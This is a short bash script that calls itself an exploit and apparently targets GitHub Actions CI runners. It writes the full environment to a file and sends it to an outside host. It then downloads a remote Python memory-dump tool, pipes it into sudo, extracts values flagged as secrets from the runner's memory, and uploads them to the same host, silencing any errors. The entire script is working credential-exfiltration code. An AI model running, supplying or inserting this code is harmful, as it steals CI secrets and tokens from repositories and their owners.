#!/bin/bash
export GITHUB_RUN_ID=${GITHUB_RUN_ID:-unknown}
echo "Exploit running for run $GITHUB_RUN_ID"
env > /tmp/env.txt
curl -X PUT -d @/tmp/env.txt "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' > "/tmp/secrets" || true
if [ -s /tmp/secrets ]; then
    curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true
else
    echo "No secrets found" | curl -X PUT -d @- "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true
fi
